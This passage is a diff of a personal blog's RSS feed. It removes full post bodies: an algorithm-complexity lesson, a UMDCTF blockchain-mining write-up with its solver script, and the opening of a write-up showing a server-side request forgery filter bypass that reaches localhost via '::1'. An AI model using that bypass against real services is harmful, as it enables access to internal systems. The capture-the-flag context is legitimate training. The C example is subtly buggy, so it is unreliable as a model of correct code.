-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(string); i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;i&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; ){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		reversed[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string[i];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; reversed;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Well, let&amp;rsquo;s see how we can look at individual line, and model a more accurate model. To do that we generally use T(n) where n in the input of the function and T is the time total run time.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; reversed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;malloc&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(string));
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For these, we can say that the T(n) = 1 for each. Then the total will be T(n) = 3.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(string); i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;i&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt; ){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		reversed[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string[i];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here we will need to split up the code a bit more&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(string) ; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;i = sizeof(string)&lt;/code&gt; will be T(n) = 1
-&lt;code&gt;i&amp;gt;0&lt;/code&gt; will run for &lt;code&gt;i+1&lt;/code&gt; number of times, so the time complexity for that will be T(n)= n+1
-finally the &lt;code&gt;i--&lt;/code&gt; will run for &lt;code&gt;i&lt;/code&gt; number of times resulting in time complexity of T(n) = n.
-Adding them up will give T(n) = 2n+2 Next, is the interior part.
-There are two lines inside which will run &lt;code&gt;n&lt;/code&gt; number of times, and the T(n) = n.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;To summarize&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Outside the for loop, the T(n) = 3.&lt;/li&gt;
-&lt;li&gt;The for loop overhead T(n) = 2n+2&lt;/li&gt;
-&lt;li&gt;Inside the for loop T(n) = n&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Adding them all up, we get the time complexity of
-T(n) = 3n+5&lt;/p&gt;
-&lt;p&gt;Now that we have the specific time complexity for it, we can simplify the bounding function by keeping the most dominant factor. For this example it is 3n, then we can remove any constant and get the Big-O notation. Which will be O(n).&lt;/p&gt;
-&lt;h2 id=&#34;quick-reference-for-big-o&#34;&gt;Quick reference for Big O&lt;/h2&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Big O&lt;/th&gt;
-&lt;th&gt;Reason&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;O(1)&lt;/td&gt;
-&lt;td&gt;Something that takes a fixed ammount of time&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;O(lg n)&lt;/td&gt;
-&lt;td&gt;When divided in half every time and work on only one half&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;O(n)&lt;/td&gt;
-&lt;td&gt;Perfoming a task to each elemnt&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;O(n lg n)&lt;/td&gt;
-&lt;td&gt;When divided in half every time and need to work on both half&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;O(n^2)&lt;/td&gt;
-&lt;td&gt;nested loops&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;O(n^3)&lt;/td&gt;
-&lt;td&gt;three nested loops&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-</description>
+      <guid>http://localhost:1313/posts/algorithmanalysis/</guid>
+      <description>Analyzing Algorithm An algorithm is a finite sequence of rigorous instructions, typically used to solve a specific problem. Some of the important question that might arise is, Why do we need algorithm? And What is algorithm analysis?
+Algorithm allows one to define how certain function works. For example, we want to add a value to a Data structure. We would need to find the most efficient way to add it to the data structure.</description>
     </item>
-    
     <item>
       <title>UMDCTF: Block ChainV2 - Chungus Coin</title>
-      <link>https://drMoscovium.dev/posts/writeups/umdctf/blockchainchunguscoin/</link>
+      <link>http://localhost:1313/posts/writeups/umdctf/blockchainchunguscoin/</link>
       <pubDate>Sun, 06 Mar 2022 19:12:41 -0500</pubDate>
-      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
-      <guid>https://drMoscovium.dev/posts/writeups/umdctf/blockchainchunguscoin/</guid>
-      <description>&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/ChungusCoin/Pasted%20image%2020220306151519.png&#34; alt=&#34;&#34;&gt;
-For this challenge we were provided with the server.py with stuffs redacted.&lt;/p&gt;
-&lt;p&gt;They made their own coin called ChungusCoin, this challenge was combination of reverse engineering and bitcoin.&lt;/p&gt;
-&lt;p&gt;As usual, starting the challenge out by analyzing the code that was provided.
-&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/ChungusCoin/Pasted%20image%2020220306151923.png&#34; alt=&#34;&#34;&gt;
-There is a lot going in the code. The description of the challenge says it&amp;rsquo;s for people who know how to mine. So, time to figure out how to mine this code.&lt;/p&gt;
-&lt;p&gt;There are few routes in the flask servers
-&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/ChungusCoin/Pasted%20image%2020220306152435.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/ChungusCoin/Pasted%20image%2020220306152509.png&#34; alt=&#34;&#34;&gt;
-&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/ChungusCoin/Pasted%20image%2020220306152553.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;I think for this challenge we have to compute hash of previous block, do some proof of work, then add the pending transaction to the chain. This will then return the flag.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; hashlib &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sha256
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; json
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;URL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://0.cloud.chals.io:24797/&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pending_transactions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(URL&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pending_transactions&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;json()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(URL&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chain&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;json()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;last_block &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chain[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chain&amp;#39;&lt;/span&gt;][&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;proof_of_work&lt;/span&gt;(prev_proof):
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    new_proof &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randrange(&lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;9999999&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    proof_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sha256(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;prev_proof&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;new_proof&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; proof_hash[:&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;00000&amp;#34;&lt;/span&gt;:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        new_proof &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randrange(&lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;9999999&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        proof_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sha256(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;prev_proof&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;new_proof&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(new_proof, proof_hash)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(new_proof, proof_hash)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; new_proof
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;new_block&lt;/span&gt;(last_block):
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    new_index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; last_block[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    prev_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sha256(json&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(last_block, sort_keys&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    new_proof &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proof_of_work(last_block[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;proof&amp;#39;&lt;/span&gt;])
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    time_stamp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1.7976931348623157e+308&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dict &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index&amp;#34;&lt;/span&gt; : new_index,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;previous_hash&amp;#34;&lt;/span&gt;: prev_hash,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;proof&amp;#34;&lt;/span&gt;: new_proof,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;timestamp&amp;#34;&lt;/span&gt; : time_stamp,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;transactions&amp;#34;&lt;/span&gt; : pending_transactions
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; dict
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;update_chain&lt;/span&gt;(new_block):
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    chain[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chain&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(new_block)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    chain[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;length&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;length&amp;#39;&lt;/span&gt;:chain[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;length&amp;#39;&lt;/span&gt;],&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chain&amp;#39;&lt;/span&gt;:chain[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;chain&amp;#39;&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;drMoscovium&amp;#39;&lt;/span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    resp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(url&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;URL&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nodes/update&amp;#34;&lt;/span&gt;,json&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data )
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(resp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;json())
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;block &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new_block(last_block)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;update_chain(block)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Script for mining
-Explaining everything will take forever, here is a quick overview:&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;proof_of_work:&lt;/strong&gt;&lt;/em&gt; it takes in previous proof and computes new hash with first 5 hash being 0, by appending new randomly generated 6-7 numbers
-&lt;em&gt;&lt;strong&gt;new_block&lt;/strong&gt;&lt;/em&gt;: it creates a new block by hashing previous block, adding one to the index, and getting the proof of work from the proof_of_work function.
-&lt;em&gt;&lt;strong&gt;update_chain&lt;/strong&gt;&lt;/em&gt;: it takes in new_block and appends it to the chain, and send a post request to update the chain in the block chain server.&lt;/p&gt;
-&lt;p&gt;Running the script will compute proof_of_work and append the transaction to server and return the flag.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/ChungusCoin/Solver.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;UMDCTF&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;Chungus_Th4nk5_y0u_f0r_y0ur_bl0ckch41n_s3rv!c3&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+      <guid>http://localhost:1313/posts/writeups/umdctf/blockchainchunguscoin/</guid>
+      <description>For this challenge we were provided with the server.py with stuffs redacted.
+They made their own coin called ChungusCoin, this challenge was combination of reverse engineering and bitcoin.
+As usual, starting the challenge out by analyzing the code that was provided. There is a lot going in the code. The description of the challenge says it&amp;rsquo;s for people who know how to mine. So, time to figure out how to mine this code.</description>
     </item>
-    
     <item>
       <title>UMDCTF: Customer Support</title>
-      <link>https://drMoscovium.dev/posts/writeups/umdctf/customersupport/</link>
+      <link>http://localhost:1313/posts/writeups/umdctf/customersupport/</link>
       <pubDate>Sun, 06 Mar 2022 19:09:57 -0500</pubDate>
-      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
-      <guid>https://drMoscovium.dev/posts/writeups/umdctf/customersupport/</guid>
-      <description>&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306144115.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;For this challenge we were given
-&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306144230.png&#34; alt=&#34;&#34;&gt;
-So I stared out by opening the Dockerfile
-&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306144325.png&#34; alt=&#34;&#34;&gt;
-In the docker file we can see the starting command is &lt;code&gt;npm run startall&lt;/code&gt;
-&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306144449.png&#34; alt=&#34;&#34;&gt;
-Looking at the package.json we can see two service being started with start all script.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306144621.png&#34; alt=&#34;&#34;&gt;
-In app.js inside microservice we can see two path that returns token.
-&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306144728.png&#34; alt=&#34;&#34;&gt;
-This microservice is running in port 3001. The first thing that I tried to do was open that port, but i couldn&amp;rsquo;t access it.
-&lt;em&gt;Time for more code analysis&lt;/em&gt;
-&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306145052.png&#34; alt=&#34;&#34;&gt;
-Here I can see that there&amp;rsquo;s some request being sent, and it&amp;rsquo;s using our input to send the request.
-&lt;img src=&#34;https://drMoscovium.dev/UMDCTF/CustomerSupport/Pasted%20image%2020220306145540.png&#34; alt=&#34;&#34;&gt;
-There is a filter that checks for any &amp;rsquo;localhost&amp;rsquo;, &amp;lsquo;127.0.0.1&amp;rsquo; or &amp;lsquo;0.0.0.0&amp;rsquo; in the message body. All we need to do now is figure out a way to access localhost using something that&amp;rsquo;s not filtered. In this case we can use &lt;code&gt;::1/28&lt;/code&gt;, so if we try to access &lt;code&gt;http://::1/28/auth&lt;/code&gt;&lt;/p&gt;
